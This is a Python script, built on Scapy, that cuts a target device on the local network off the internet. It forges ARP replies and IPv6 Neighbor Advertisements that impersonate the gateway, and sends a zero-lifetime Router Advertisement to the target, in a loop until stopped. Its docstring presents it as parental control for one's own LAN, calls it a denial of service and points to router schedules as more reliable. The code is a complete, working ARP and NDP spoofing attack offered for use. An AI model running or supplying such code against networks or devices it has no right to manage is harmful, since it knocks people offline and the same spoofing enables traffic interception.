#!/usr/bin/env python3
"""
Limit internet access for a device on YOUR OWN LAN (a device you are allowed to manage,
e.g. a parent limiting their own child's device). Do not use this against other people.

How it works:
  - IPv4: impersonate the gateway via ARP so the target's IPv4 traffic goes to this PC
          and is dropped.
  - IPv6: phones/tablets usually prefer IPv6, so ARP alone leaves an IPv6 path open and
          the device stays online. We also poison NDP (Neighbor Discovery): we impersonate
          the gateway's link-local (fe80::) address so the target's IPv6 internet traffic
          also goes to this PC and is dropped.

Usage:
  python net_control.py start [target_ip]   start limiting (Ctrl+C to stop and restore)
  python net_control.py stop                restore the network

Note: this is essentially a denial-of-service against that device -- it cuts it off the
internet completely, and this PC must stay running. For reliable parental control, the
router's built-in per-device schedule is far less fragile.
"""

import ipaddress
import json
import os
import re
import subprocess
import sys
import time
import platform

from scapy.all import Ether, ARP, srp, srp1, sendp, get_if_hwaddr, conf

# ====== Edit the IP addresses below ======
CHILD_IP = "192.168.31.38"     # target device IP (or pass it: start 192.168.31.38)
MY_IP = "192.168.31.15"        # this PC's IP
GATEWAY_IP = "192.168.31.1"     # router / gateway IP
# =========================================

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(SCRIPT_DIR, ".net_control.dat")
PID_FILE = os.path.join(SCRIPT_DIR, ".net_control.pid")
SPOOF_INTERVAL_SECONDS = 1.0
IPV6_REFRESH_SECONDS = 8.0
conf.verb = 0


def normalize_mac(mac: str) -> str:
    return re.sub(r"[^0-9A-Fa-f]", "", mac or "").lower()


def clean_ipv6(addr: str) -> str:
    """Drop Windows zone IDs such as %14 and normalize enough for comparisons."""
    return (addr or "").split("%")[0].strip().lower()


def is_usable_ipv6(addr: str) -> bool:
    addr = clean_ipv6(addr)
    return bool(addr and ":" in addr and not addr.startswith("ff") and addr not in {"::", "::1"})


def unique_ipv6(addrs):
    seen = set()
    result = []
    for addr in addrs:
        addr = clean_ipv6(addr)
        if is_usable_ipv6(addr) and addr not in seen:
            seen.add(addr)
            result.append(addr)
    # Prefer link-local first because default IPv6 routers are normally fe80:: addresses.
    return sorted(result, key=lambda item: (not item.startswith("fe80:"), item))


def mac_to_eui64_link_local(mac: str) -> str:
    """Best-effort link-local guess for devices that derive IPv6 from their MAC."""
    mac_hex = normalize_mac(mac)
    if len(mac_hex) != 12:
        return ""
    parts = [int(mac_hex[i : i + 2], 16) for i in range(0, 12, 2)]
    parts[0] ^= 0x02
    eui64 = parts[:3] + [0xFF, 0xFE] + parts[3:]
    groups = [
        (eui64[0] << 8) | eui64[1],
        (eui64[2] << 8) | eui64[3],
        (eui64[4] << 8) | eui64[5],
        (eui64[6] << 8) | eui64[7],
    ]
    return str(ipaddress.IPv6Address("fe80::" + ":".join(f"{group:x}" for group in groups)))


def choose_iface_and_ip(*destinations):
    """Pick the NIC Scapy would use to reach the target/gateway instead of relying
    on conf.iface, which can point at VPN/virtual adapters on Windows."""
    for dst in destinations:
        if not dst:
            continue
        try:
            route = conf.route.route(dst)
        except Exception:
            continue
        if not route:
            continue
        iface = route[0]
        my_ip = route[1] if len(route) > 1 else ""
        if iface and my_ip and not str(my_ip).startswith("127."):
            return iface, my_ip
    return conf.iface, MY_IP


def get_ipv6_gateway_ll() -> str:
    """Find the next-hop link-local address of the default IPv6 route (::/0). Windows only."""
    if platform.system() != "Windows":
        return ""
    try:
        result = subprocess.run(
            ["netsh", "interface", "ipv6", "show", "route"],
            capture_output=True, text=True, encoding="utf-8",
            errors="ignore", timeout=8, check=False,
        )
    except (OSError, subprocess.TimeoutExpired):
        return ""
    for line in result.stdout.splitlines():
        if "::/0" in line:
            match = re.search(r"(fe80::[0-9A-Fa-f:%]+)", line)
            if match:
                return clean_ipv6(match.group(1))
    return ""


def read_ipv6_neighbors() -> dict[str, list[str]]:
    """Read Windows' IPv6 neighbor table as {normalized_mac: [ipv6, ...]}."""
    neighbors: dict[str, list[str]] = {}
    if platform.system() != "Windows":
        return neighbors
    try:
        result = subprocess.run(
            ["netsh", "interface", "ipv6", "show", "neighbors"],
            capture_output=True, text=True, encoding="utf-8",
            errors="ignore", timeout=8, check=False,
        )
    except (OSError, subprocess.TimeoutExpired):
        return neighbors
    row_re = re.compile(
        r"^\s*([0-9A-Fa-f:]+(?:%\w+)?)\s+([0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5})\s+(\S+)"
    )
    for line in result.stdout.splitlines():
        match = row_re.match(line)
        if not match:
            continue
        addr, neigh_mac, state = match.group(1), match.group(2), match.group(3).lower()
        if state in {"unreachable", "incomplete"}:
            continue
        addr = clean_ipv6(addr)
        if not is_usable_ipv6(addr):
            continue
        mac_key = normalize_mac(neigh_mac)
        if len(mac_key) != 12:
            continue
        neighbors.setdefault(mac_key, []).append(addr)
    return {mac: unique_ipv6(addrs) for mac, addrs in neighbors.items()}


def find_ipv6_addresses(mac: str) -> list[str]:
    """Find all IPv6 addresses currently known for a MAC address."""
    return read_ipv6_neighbors().get(normalize_mac(mac), [])


def find_ipv6_link_local(mac: str) -> str:
    """Find a device's link-local (fe80::) address in the system neighbor table."""
    for addr in find_ipv6_addresses(mac):
        if addr.startswith("fe80:"):
            return addr
    return ""


class NetController:
    def __init__(self):
        self.iface, self.my_ip = choose_iface_and_ip(CHILD_IP, GATEWAY_IP)
        self.my_mac = get_if_hwaddr(self.iface)
        self.child_mac = None
        self.gateway_mac = None
        # IPv6 (left as None if unavailable -> automatically falls back to IPv4 only)
        self.child_ll = None
        self.child_ipv6_addrs = []
        self.gateway_ll = None
        self.ipv6_ok = False
        self.running = False
        self.last_ipv6_refresh = 0.0

    # ---------- IPv4 / ARP ----------
    def resolve_mac(self, ip):
        result = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff", src=self.my_mac) / ARP(pdst=ip),
            iface=self.iface, timeout=3, verbose=0
        )
        return result[Ether].src if result else None

    def send_arp(self, dst_mac, dst_ip, src_mac, src_ip):
        pkt = Ether(dst=dst_mac, src=src_mac) / ARP(
            op=2, hwsrc=src_mac, psrc=src_ip,
            hwdst=dst_mac, pdst=dst_ip
        )
        sendp(pkt, iface=self.iface, verbose=0)

    # ---------- IPv6 / NDP ----------
    def discover_ipv6_neighbors(self):
        """Ping ff02::1 and collect replies directly from Scapy.

        Relying only on Windows' neighbor table is brittle because raw Scapy traffic
        is not always reflected there quickly enough.
        """
        neighbors = {}
        try:
            from scapy.all import IPv6, ICMPv6EchoRequest
            ans, _ = srp(
                Ether(dst="33:33:00:00:00:01", src=self.my_mac)
                / IPv6(dst="ff02::1", hlim=255) / ICMPv6EchoRequest(),
                iface=self.iface, timeout=2, verbose=0,
            )
        except Exception:
            return neighbors

        for _, received in ans:
            if not received.haslayer(Ether) or not received.haslayer(IPv6):
                continue
            mac = normalize_mac(received[Ether].src)
            addr = clean_ipv6(received[IPv6].src)
            if len(mac) == 12 and is_usable_ipv6(addr):
                neighbors.setdefault(mac, []).append(addr)
        return {mac: unique_ipv6(addrs) for mac, addrs in neighbors.items()}

    def refresh_ipv6_targets(self):
        found = read_ipv6_neighbors()
        discovered = self.discover_ipv6_neighbors()
        for mac, addrs in discovered.items():
            found.setdefault(mac, []).extend(addrs)

        gateway_addrs = unique_ipv6(found.get(normalize_mac(self.gateway_mac), []))
        self.gateway_ll = (
            get_ipv6_gateway_ll()
            or next((addr for addr in gateway_addrs if addr.startswith("fe80:")), "")
        )
        self.child_ipv6_addrs = unique_ipv6(
            found.get(normalize_mac(self.child_mac), [])
            + [mac_to_eui64_link_local(self.child_mac)]
        )
        self.child_ll = next(
            (addr for addr in self.child_ipv6_addrs if addr.startswith("fe80:")),
            "",
        )
        self.ipv6_ok = bool(self.gateway_ll and self.child_ipv6_addrs)
        self.last_ipv6_refresh = time.monotonic()
        return self.ipv6_ok

    def send_na(self, eth_dst, ip6_src, ip6_dst, target, lladdr, router):
        """Send a forged NDP Neighbor Advertisement: claim that IPv6 address `target`
        lives on the NIC `lladdr`."""
        from scapy.all import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
        pkt = (
            Ether(dst=eth_dst, src=lladdr)
            / IPv6(src=ip6_src, dst=ip6_dst, hlim=255)
            / ICMPv6ND_NA(tgt=target, R=int(router), S=0, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=lladdr)
        )
        sendp(pkt, iface=self.iface, verbose=0)

    def send_ra_zero_lifetime(self):
        """Tell only the target that this router is no longer a valid IPv6 default route.

        This is a targeted fallback for phones that do not expose their IPv6 address to
        this PC's neighbor table. It does not touch broadcast/multicast recipients.
        """
        if not self.gateway_ll or not self.child_ll:
            return
        from scapy.all import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr
        pkt = (
            Ether(dst=self.child_mac, src=self.my_mac)
            / IPv6(src=self.gateway_ll, dst=self.child_ll, hlim=255)
            / ICMPv6ND_RA(routerlifetime=0)
            / ICMPv6NDOptSrcLLAddr(lladdr=self.my_mac)
        )
        sendp(pkt, iface=self.iface, verbose=0)

    def setup_ipv6(self):
        """Learn the gateway link-local address and every IPv6 address for the target."""
        return self.refresh_ipv6_targets()

    # ---------- spoof / restore ----------
    def spoof(self):
        if time.monotonic() - self.last_ipv6_refresh >= IPV6_REFRESH_SECONDS:
            self.refresh_ipv6_targets()

        # IPv4: tell the target "I am the gateway", tell the gateway "I am the target".
        self.send_arp(self.child_mac, CHILD_IP, self.my_mac, GATEWAY_IP)
        self.send_arp(self.gateway_mac, GATEWAY_IP, self.my_mac, CHILD_IP)
        # IPv6: poison the target's gateway entry and the router's entries for every
        # address the phone currently uses, including temporary privacy addresses.
        if self.ipv6_ok:
            for child_addr in self.child_ipv6_addrs:
                self.send_na(self.child_mac, self.gateway_ll, child_addr,
                             self.gateway_ll, self.my_mac, router=True)
                self.send_na(self.gateway_mac, child_addr, self.gateway_ll,
                             child_addr, self.my_mac, router=False)
            self.send_ra_zero_lifetime()

    def restore(self):
        for _ in range(4):
            # IPv4: restore the real MACs.
            self.send_arp(self.child_mac, CHILD_IP, self.gateway_mac, GATEWAY_IP)
            self.send_arp(self.gateway_mac, GATEWAY_IP, self.child_mac, CHILD_IP)
            # IPv6: restore the real MACs.
            if self.ipv6_ok:
                for child_addr in self.child_ipv6_addrs:
                    self.send_na(self.child_mac, self.gateway_ll, child_addr,
                                 self.gateway_ll, self.gateway_mac, router=True)
                    self.send_na(self.gateway_mac, child_addr, self.gateway_ll,
                                 child_addr, self.child_mac, router=False)
            time.sleep(0.3)

    # ---------- state persistence ----------
    def save_state(self):
        with open(STATE_FILE, "w") as f:
            json.dump({
                "child_mac": self.child_mac,
                "gateway_mac": self.gateway_mac,
                "my_mac": self.my_mac,
                "child_ll": self.child_ll,
                "child_ipv6_addrs": self.child_ipv6_addrs,
                "gateway_ll": self.gateway_ll,
                "ipv6_ok": self.ipv6_ok,
                "child_ip": CHILD_IP,
                "iface": str(self.iface),
                "my_ip": self.my_ip,
            }, f)

    def load_state(self):
        global CHILD_IP
        with open(STATE_FILE) as f:
            state = json.load(f)
            CHILD_IP = state.get("child_ip", CHILD_IP)
            self.iface, self.my_ip = choose_iface_and_ip(CHILD_IP, GATEWAY_IP)
            self.my_mac = get_if_hwaddr(self.iface)
            self.child_mac = state["child_mac"]
            self.gateway_mac = state["gateway_mac"]
            self.child_ll = state.get("child_ll")
            self.child_ipv6_addrs = unique_ipv6(
                state.get("child_ipv6_addrs") or [self.child_ll]
            )
            self.gateway_ll = state.get("gateway_ll")
            self.ipv6_ok = state.get("ipv6_ok", False)

    def run(self):
        print("Resolving MAC addresses...")
        self.child_mac = self.resolve_mac(CHILD_IP)
        self.gateway_mac = self.resolve_mac(GATEWAY_IP)

        if not self.child_mac:
            print(f"[error] target device {CHILD_IP} not found")
            print("  Check: 1) the device is on and connected  2) the IP is correct")
            input("Press Enter to exit...")
            return

        if not self.gateway_mac:
            print(f"[error] gateway {GATEWAY_IP} not found")
            input("Press Enter to exit...")
            return

        print("Probing IPv6 (phones/tablets usually prefer IPv6)...")
        self.setup_ipv6()

        self.save_state()
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))

        print(f"Target:  {CHILD_IP} -> {self.child_mac}")
        print(f"Gateway: {GATEWAY_IP} -> {self.gateway_mac}")
        print(f"This PC: {self.my_ip} -> {self.my_mac}")
        print(f"Iface:   {self.iface}")
        if self.ipv6_ok:
            print(f"IPv6:    target {', '.join(self.child_ipv6_addrs)}")
            print(f"         gateway {self.gateway_ll}  -> enabled")
        else:
            print("IPv6:    not enabled (no IPv6 found for target or gateway; IPv4 only)")
            print("         If the target is a phone and still has internet, it is likely")
            print("         using IPv6 -- make sure it is online and retry, or check whether")
            print("         the router hands out IPv6.")
        print()
        print("Limiting is ON. The target device is cut off.")
        print("  Wi-Fi/Ethernet still shows connected, but it has no internet.")
        print()
        print("Press Ctrl+C or run release.bat to restore.")
        print("-" * 40)

        self.running = True
        try:
            while self.running:
                self.spoof()
                time.sleep(SPOOF_INTERVAL_SECONDS)
        except KeyboardInterrupt:
            pass
        finally:
            self.restore()
            self.running = False
            for f in [STATE_FILE, PID_FILE]:
                if os.path.exists(f):
                    os.remove(f)
            print("Network restored.")


def cmd_stop():
    if not os.path.exists(STATE_FILE):
        print("No running limiter found.")
        return

    ctrl = NetController()
    ctrl.load_state()
    ctrl.restore()
    print("ARP/NDP tables restored.")

    if os.path.exists(PID_FILE):
        with open(PID_FILE) as f:
            pid = f.read().strip()
        if pid:
            os.system(f"taskkill /F /PID {pid} >nul 2>&1")
        for f in [STATE_FILE, PID_FILE]:
            if os.path.exists(f):
                os.remove(f)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "stop":
        cmd_stop()
    else:
        # Allow: start 192.168.x.x  to pick the target without editing the source.
        if len(sys.argv) > 2 and sys.argv[1] == "start":
            CHILD_IP = sys.argv[2]
        NetController().run()
